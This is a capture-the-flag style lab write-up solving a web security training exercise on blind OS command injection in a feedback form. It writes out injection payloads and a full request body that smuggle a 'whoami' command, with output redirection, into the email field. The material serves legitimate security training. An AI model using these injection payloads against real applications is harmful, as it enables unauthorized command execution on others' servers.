# Lab Blind OS command injection with output redirection

## Objective
 This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

/var/www/images/

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output. 

## Big Idea

 You can redirect the output from the injected command into a file within the web root that you can then retrieve using your browser. For example, if the application serves static resources from the filesystem location /var/www/static, then you can submit the following input:

& whoami > /var/www/static/whoami.txt &

The > character sends the output from the whoami command to the specified file. You can then use your browser to fetch https://vulnerable-website.com/whoami.txt to retrieve the file, and view the output from the injected command. 

This is what the lab landing page  looks like 

![image](https://user-images.githubusercontent.com/90155329/135767912-b4e3e41b-da8c-465f-969d-dfaea7c9928e.png)

I visited the "Submit feedback"  page which responded with the following

![image](https://user-images.githubusercontent.com/90155329/135767917-46a8366e-5c45-4b94-8865-0fa79f9d9e31.png)

I entered the following values and intercepted the request with Burp Intercept. Intercept is good to see what web requests look like.

![image](https://user-images.githubusercontent.com/90155329/135767928-84c4de55-b039-4bcf-9e80-c2b177943ddd.png)

![image](https://user-images.githubusercontent.com/90155329/135767930-5cda6d9a-ef17-4f65-8f14-06b91cc58532.png)

I sent the request to Burp Repeater. Repeater is good for testing a single page because I can quickly modify and test the requests. 

I will try adding the payload to the "Email" value. If the email value is using some sort of system command in the backend, then it will execute the command

;& whoami > /var/www/static/whoami.txt &


csrf=LFdExmEb9vhICqGEcmoG88sQnBA6l8j4&name=bagelHacks&email=bagelHacks%40hacks.hacks;whoami > /var/www/static/whoami.txt &&subject=test&message=test

![image](https://user-images.githubusercontent.com/90155329/135767934-aa40bd94-be00-4442-8e34-54cfc241adaa.png)

The above payload did not seem to work. 

Eventually, I used the following payload which worked.

![image](https://user-images.githubusercontent.com/90155329/135767947-9abf7cdb-2a42-4ecc-9898-01706dab5140.png)

csrf=LFdExmEb9vhICqGEcmoG88sQnBA6l8j4&name=bagelHacks&email=bagleHacks@hack.hack;`whoami>+/var/www/images/whoami.txt`&subject=test&message=test

In linux, back ticks are usually executed first which means in the above payload `whoami > /var/www/images/whoami.txt` will be executed before anything else.


Visiting https://ac6e1f301f8dd56580ef1d6c001a00de.web-security-academy.net/image?filename=whoami.txt shows the results of the whoami output.

![image](https://user-images.githubusercontent.com/90155329/135767955-d2bea869-29d3-4055-97dd-7ed8e9166eff.png)

![image](https://user-images.githubusercontent.com/90155329/135767960-8f635858-2075-4cca-a730-ec4ea9c7702d.png)
